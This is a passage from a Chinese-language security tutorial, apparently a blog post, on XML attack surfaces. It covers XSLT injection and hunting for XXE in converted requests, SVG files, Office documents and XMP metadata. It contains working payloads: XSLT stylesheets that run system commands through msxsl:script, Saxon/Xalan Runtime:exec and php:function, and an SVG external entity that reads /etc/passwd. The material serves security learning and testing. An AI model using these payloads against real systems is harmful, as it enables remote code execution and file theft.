0.5em;color: rgb(63, 63, 63);">yes</td></tr><tr><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">chrome</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">1</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">libxslt</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">yes</td></tr><tr><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">firefox</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">1</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">Transformiix</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">yes</td></tr><tr><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">internet explorer</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">1</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">Microsoft</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">yes</td></tr></tbody></table>  
> From @IOActive: Abusing XSLT for Practical Attacks White Paper  
  
  
如果显示的是 Microsoft XSLT 解释器，那么可以尝试通过 msxsl:script 标签来执行 C# 代码:  
```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
  xmlns:msxsl="urn:schemas-microsoft-com:xslt" 
  xmlns:App="http://www.tempuri.org/App">
  <msxsl:script implements-prefix="App" language="C#">
  <![CDATA[
    {
      System.Diagnostics.Process.Start("cmd.exe /C calc.exe");
    }
  ]]>
  </msxsl:script>
  <xsl:template match="/">
  </xsl:template>
</xsl:stylesheet>
```  
  
不过这通常需要设置 XsltSettings.EnableScript，参考   
Script Blocks Using msxsl:script[37]。  
  
如果显示的是 SAXON xxx from Saxonica 即 Saxon 解释器，那么可以通过 xalan:script 来尝试执行 Java 代码:  
```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:xalan="http://xml.apache.org/xslt" xmlns:Math="xalan://java.lang.Math">
  <xalan:component prefix="Math" functions="sin cos tan atan">
    <xalan:script lang="javaclass" src="xalan://java.lang.Math"/>
  </xalan:component>
  <xsl:variable name="pi" select="4.0 *"/>
  <!-- ... -->
</xsl:stylesheet>
```  
  
Saxon 官网文档[38]都是德文的，除了上述这种官网的用法外，还找到另一种执行代码的方法:  
```
<xml version="1.0"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
  <xsl:template match="/">
    <xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'calc.exe')" xmlns:Runtime="java:java.lang.Runtime"/>
  </xsl:template>
</xsl:stylesheet>
```  
  
使用 Xalan 执行代码并获取返回内容的示例:  
```
<?xml version="1.0" encoding="ISO-8859-1" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:fo="http://www.w3.org/1999/XSL/Format">    
    <xsl:template match="CClienti">
        <CClienti label="{{0}} Trasformato">
<xsl:variable name="abcd" select="Runtime:exec(Runtime:getRuntime(),'ifconfig')" xmlns:Runtime="http://xml.apache.org/xalan/java/java.lang.Runtime"/> 
<xsl:variable name="efgh" select="jv:getInputStream($abcd)" xmlns:jv="http://xml.apache.org/xalan/java"/> 
<xsl:variable name="ijkl" select="isr:new($efgh)" xmlns:isr="http://xml.apache.org/xalan/java/java.io.InputStreamReader"/> 
<xsl:variable name="mnop" select="br:new($ijkl)" xmlns:br="http://xml.apache.org/xalan/java/java.io.BufferedReader"/> 
<xsl:value-of select="jv:readLine($mnop)" xmlns:jv="http://xml.apache.org/xalan/java"/> 
<xsl:value-of select="jv:readLine($mnop)" xmlns:jv="http://xml.apache.org/xalan/java"/>           
        </CClienti>
    </xsl:template>

    <xsl:template match="@*|node()">
        <xsl:copy>
            <xsl:apply-templates select="@*|node()"/>
        </xsl:copy>
    </xsl:template>
    
</xsl:stylesheet>
```  
  
对于 PHP 环境，可以尝试使用 php:function 调用任意 PHP 函数:  
```
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:value-of select="php:function('readfile','index.php')" />
</body>
</html>
```  
  
因此我们在遇到 XSLT 被解析的时候需要格外关注，并针对对应 Vendor 仔细查看其文档，说不定就能捡到一个 RCE 漏洞呢！  
- •   
Abusing XSLT for Practical Attacks White Paper[39]  
  
- •   
XSLT Injections for Dummies[40]  
  
- •   
XLST Injection Basics[41] (  
中文: 从XSLT注入到Getshell[42])  
  
- •   
OverIT framework XSLT Injection and XXE – CVE-2022-22834 & CVE-2022-22835[43]  
  
- •   
PayloadsAllTheThings - XSLT Injection[44]  
  
# 漏洞挖掘  
  
通过前面的学习和总结，我们已经知道了 XML 的各种攻击面，接下来就是在所有能遇到 XML 的地方把 payload 喷射一遍了。除了传统的攻击点，还有一些不常见的攻击场景，本节就来进行介绍。  
## 请求变体  
  
传统上我们测试 XXE 漏洞会在遇到有 XML 请求时尝试修改请求体去验证外部实体的解析情况，但在一些场景中我们可以无中生有，将原本不是 XML 的请求修改成 XML 进行测试。  
  
例如，对于一个常规的 POST FORM 请求:  
```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
foo=bar
```  
  
我们可以将其转成 XML 格式，如下:  
```
POST /action HTTP/1.0
Content-Type: application/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?>
<foo>bar</foo>
```  
  
如果服务端返回的结果相同，那么就可能解析 XML，从而进行下一步 XXE 验证。这是因为当今许多 Web 框架都会根据 Content-Type 去自动进行参数解析和绑定，特别是 SpringBoot 这类框架还会将请求参数解析成 Java Bean 实例传给开发者。其他可尝试转换的请求有 HTTP GET 参数、JSON Body 等。  
- •   
OWASP: XML External Entity (XXE) Processing[45]  
  
- •   
OWASP: XML External Entity Prevention[46]  
  
- •   
PortSwigger : XML external entity (XXE) injection[47]  
  
- •   
hacktricks: xee-xml-external-entity.md[48]  
  
- •   
奇安信攻防社区 - XXE漏洞[49]  
  
## SVG  
  
SVG 是一种图片格式，但也是合法的 XML 文件，可以尝试引用外部实体:  
```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [  <!ENTITY poc SYSTEM "file:///etc/passwd">]>
<svg width="128" height="128" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&poc;</text>
</svg>
```  
  
在前面提到过的 ImageMagic   
CVE-2023-38633[50] 中就有因为 XInclude 导致的 XXE 漏洞，因此如果文件上传时可以上传带外部实体的 SVG 文件，如果服务器使用的 SVG 解析器不当的话也会造成 XXE 风险。  
## Microsoft Office  
  
微软的 Office 套件即常见的三件套:  
- • Word 文档，后缀为 .doc  
  
- • Excel 表格，后缀为 .xls  
  
- • PowerPoint，后缀为 .ppt  
  
在 2006 年，微软提出了 OOXML，即 Open Office XML 格式，也就是我们常见的带 x 后缀的新文件名 .docx、.xlsx 和 .pptx。在 2022 年被 ISO 收纳成为国际标准并改名为 OXML 即 Open XML。  
  
顾名思义，OXML 也是基于 XML 的，其本体是一个 ZIP 压缩文档，其中的文档内容以 XML 文件的形式组织。因此，Office 文档也可以当成 XXE 漏洞的载体。QQ 邮箱和网易邮箱等附件预览处都曾出现过 XXE 漏洞。  
  
一个典型的 docx 文件解压后的目录结构如下所示：  
```
$ tree foo.docx/
foo.docx/
├── [Content_Types].xml
├── docProps
│   ├── app.xml
│   └── core.xml
├── _rels
└── word
    ├── charts
    │   └── chart1.xml
    ├── document.xml
    ├── fontTable.xml
    ├── media
    │   └── image1.jpeg
    ├── numbering.xml
    ├── _rels
    │   └── document.xml.rels
    ├── settings.xml
    └── styles.xml
```  
- •   
ECMA-376 - Office Open XML file formats[51]  
  
- •   
Open XML SDK by Microsoft[52]  
  
- •   
oxml_xxe: A tool for embedding XXE/XML exploits into different filetypes (BHUSA 2015)[53]  
  
## XMP  
  
另外一种可能鲜为人知的 XML 数据结构是 XMP，全程为 Extensible Metadata Platform，即可拓展元数据平台。这是由 Adobe 创建的一种标准，用于处理和存储文档和图片数据中的自定义元数据，包括 PDF、JPEG、PNG、MP3 等多种格式。  
  
在文件中添加 XMP 元数据可以使用 exiftool，下面是一个具体的使用示例。  
  
首先用 ImageMagick 创建一个 1x1 的示例图片：  
```
convert -size 1x1 xc:transparent png:poc.png
```  
  
以该 PNG 为例，我们需要先用 exiftool 创建一个 poc.xmp，并将其合并到 poc.png 中：  
```
$ exiftool -XMP-dc:Creator="evilpan" -XMP-dc:Rights="© evilpan 2024" -o poc.xmp
$ exiftool -tagsfromfile poc.xmp -xmp poc.png
Warning: [minor] Text/EXIF chunk(s) found after PNG IDAT (fixed) - poc.png
    1 image files updated
```  
  
poc.xmp 的文件内容如下：  
```
<?xpacket begin='<feff> ' id='W5M0MpCehiHzreSzNTczkc9d'?>
<x:xmpmeta xmlns:x='adobe:ns:meta/' x:xmptk='Image::ExifTool 12.40'>
<rdf:RDF xmlns:rdf='http://www.w3.org/1999/02/22-rdf-syntax-ns#'>

 <rdf:Description rdf:about=''
  xmlns:dc='http://purl.org/dc/elements/1.1/'>
  <dc:creator>
   <rdf:Seq>
    <rdf:li>evilpan</rdf:li>
   </rdf:Seq>
  </dc:creator>
  <dc:rights>
   <rdf:Alt>
    <rdf:li xml:lang='x-default'>© evilpan 2024</rdf:li>
   </rdf:Alt>
  </dc:rights>
 </rdf:Description>
</rdf:RDF>
</x:xmpmeta>
<?xpacket end='w'?>
```  
  
这是一个典型的 XML 格式文件。根据目标格式不同，XMP 存储的位置也不一样，对于 JPEG 会添加到图片文件的 EXIF 中，对于 PNG 文件则是添加一个 iTXt 段。直接用 exiftool 来查看插入的 XMP 数据：  
```
$ exiftool poc.png
...
XMP Toolkit                     : Image::ExifTool 12.40
Creator                         : evilpan
Rights                          : © evilpan 2024
Image Size                      : 1x1
Megapixels                      : 0.000001

```  
  
可以看到 Creator 和 Rights 信息已经添加到了图片中。使用二进制编辑器也可以看到插入的 XML 数据：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3eicVGzibzClBwcGgibVewXdv6ZodAdTntnchK3hwiaY6QKGybXDicib0FTUGjniaYgv1YTenUDjqgMTzteGEI1G8rmibA/640?wx_fmt=png&from=appmsg "poc.png 中嵌入 XML(XMP) 数据")  
  
目前 XMP 已经成为了一个 ISO 标准(16684-1:2012)，因此使用范围广泛。对于我们的安全研究而言，尝试在不同的文件中插入携带 XML payload 的 XMP 数据也是一种值得尝试的攻击方式。  
- •   
Extensible_Metadata_Platform - Wikipedia[54]  
  
- •   
XMP Specification[55]  
  
- •   
Exploiting XXE in File Upload Functionality - Webcast[56]  
  
- • https://oxmlxxe.github.io/  
  
# 后记  
  
XML，一个简单的文本文档格式，却涵盖了从 DoS、XSS、XXE、SSRF 到 RCE 等常见的漏洞风险。除了常规的 XML 请求如 SOAP，我们还可以将普通的表单或者 JSON 转换成 XML 进行测试；另外除了一些广为人知的 XML 文件如 SVG、DOCX 等，还有许多潜在的元数据会以 XML 的形式存储，比如在 PDF、PNG、JPG、MP4 等文件中都有以 XMP 形式存在的 XML 数据，以此我们也能管窥 XML 格式的使用范围之广泛，因此对 XML 相关的风险进行深入理解对于安全攻防而言也是至关重要的。  
  
如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款前面有同学问我有没优惠券，这里发放100张100元的优惠券,用完今年不再发放  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7N5nMaJbtnMPVw96ZcVbWfp6SGDicUaGZyrWOM67xP8Ot3ftyqOybMqbj1005WvMNbDJO0hOWkCaQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
## 往期回顾  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486912&idx=1&sn=8704ce12dedf32923c6af49f1b139470&chksm=e8a607a3dfd18eb5abc302a40da024dbd6ada779267e31c20a0fe7bbc75a5947f19ba43db9c7&scene=21#wechat_redirect)  
  
[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)  
  
  
[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
[](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
  
  
[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
  
  
  
  
#### 引用链接  
  
[1] Extensible Markup Language (XML) 1.0 (Fifth Edition): https://www.w3.org/TR/xml/[2] XML - wikipedia: https://en.wikipedia.org/wiki/XML[3] -//W3C//DTD HTML 4.01//EN: http://www.w3.org/TR/html4/strict.dtd[4] -//W3C//DTD HTML 4.01 Transitional//EN: http://www.w3.org/TR/html4/loose.dtd[5] -//W3C//DTD HTML 4.01 Frameset//EN: http://www.w3.org/TR/html4/frameset.dtd[6] Document_type_definition - Wikipedia: https://en.wikipedia.org/wiki/Document_type_definition[7] Prolog and Document Type Declaration: https://www.w3.org/TR/xml/#sec-prolog-dtd[8] Character and Entity References: https://www.w3.org/TR/xml/#sec-references[9] XML entity: https://en.wikipedia.org/w/index.php?titl[10] 在 XML 中添加实体: https://web.archive.org/web/20100405232602/http://www.ibm.com/developerworks/cn/xml/x-entities/[11] 备份: https://blog.csdn.net/janchin/article/details/46849209[12] List of XML and HTML character entity references: https://en.wikipedia.org/w/index.php?title=List_of_XML_and_HTML_character_entity_references[13] XML namespaces: https://en.wikipedia.org/wiki/XML_namespace[14] XML Schema (W3C): https://en.wikipedia.org/wiki/XML_Schema_(W3C)[15] W3Cs XML Schema Primer: http://www.w3.org/TR/xmlschema-0/[16] XPointer Framework: https://www.w3.org/TR/xinclude/#XPCore[17] XInclude - wikipedia: https://en.wikipedia.org/wiki/XInclude[18] Using XInclude: https://www.xml.com/pub/a/2002/07/31/xinclude.html[19] XInclude Standard: http://www.w3.org/TR/xinclude/[20] XSLT - Wikipedia: https://en.wikipedia.org/wiki/XSLT[21] XSL Transformations (XSLT) Version 1.0: https://www.w3.org/TR/xslt-10/[22] XSL Transformations (XSLT) Version 2.0 (Second Edition): https://www.w3.org/TR/xslt20/[23] XSL Transformations (XSLT) Version 3.0: https://www.w3.org/TR/xslt-30/[24] XInclude with XSLT: http://www.xml.com/pub/a/2007/03/28/xinclude-processing-in-xslt-with-xipr.html[25] Java API for XML Processing (JAXP) Tutorial - XSLT: https://www.oracle.com/java/technologies/jaxp-xslt.html[26] Billion laughs attack: https://en.wikipedia.org/wiki/Billion_laughs_attack[27] ImageMagick 的 CVE-2023-38633: https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/[28] 获得 $28000 赏金的 Safari CVE-2023-40415 和 Chrome CVE-2023-4357: https://swarm.ptsecurity.com/xxe-chrome-safari-chatgpt/[29] Exploiting XXE with local DTD files: https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/[30] When URL parsers disagree (CVE-2023-38633): https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/[31] Getting XXE in Web Browsers using ChatGPT: https://swarm.ptsecurity.com/xxe-chrome-safari-chatgpt/[32] Chromium#4822244 [M114-LTS] Set current document when processing xsl document(): https://chromium-review.googlesource.com/c/chromium/src/+/4822244[33] REDTEAM TALES 0X1: SOAPY XXE: https://www.optistream.io/blogs/tech/redteam-stories-1-soapy-xxe[34] Exploiting XXE with local DTD files: https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/[35] 以 Apache Solr CVE-2017-12629 为例介绍三种 Error Based XXE 在实战中利用的方法 - phith0n: https://t.zsxq.com/SB5kj[36] @IOActive: https://x.com/ioactive[37] Script Blocks Using msxsl:script: https://learn.microsoft.com/en-us/dotnet/standard/data/xml/script-blocks-using-msxsl-script[38] Saxon 官网文档: https://www.data2type.de/xml-xslt-xslfo/xslt[39] Abusing XSLT for Practical Attacks White Paper: https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf[40] XSLT Injections for Dummies: https://ine.com/blog/xslt-injections-for-dummies[41] XLST Injection Basics: https://www.atlan.digital/lab/xslt-injection-basics[42] 中文: 从XSLT注入到Getshell: https://xz.aliyun.com/t/6141[43] OverIT framework XSLT Injection and XXE – CVE-2022-22834 & CVE-2022-22835: https://labs.yarix.com/2022/03/overit-framework-xslt-injection-and-xxe-cve-2022-22834-cve-2022-22835/[44] PayloadsAllTheThings - XSLT Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md[45] OWASP: XML External Entity (XXE) Processing: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing[46] OWASP: XML External Entity Prevention: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html[47] PortSwigger : XML external entity (XXE) injection: https://portswigger.net/web-security/xxe[48] hacktricks: xee-xml-external-entity.md: https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xxe-xee-xml-external-entity.md[49] 奇安信攻防社区 - XXE漏洞: https://forum.butian.net/share/2573[50] CVE-2023-38633: https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/[51] ECMA-376 - Office Open XML file formats: https://www.ecma-international.org/publications-and-standards/standards/ecma-376/[52] Open XML SDK by Microsoft: https://github.com/dotnet/Open-XML-SDK[53] oxml_xxe: A tool for embedding XXE/XML exploits into different filetypes (BHUSA 2015): https://github.com/BuffaloWill/oxml_xxe[54] Extensible_Metadata_Platform - Wikipedia: https://en.wikipedia.org/wiki/Extensible_Metadata_Platform[55] XMP Specification: http://www.adobe.com/devnet/xmp/[56] Exploiting XXE in File Upload Functionality - Webcast: https://oxmlxxe.github.io/reveal.js/bh_webcast.html  
  
  
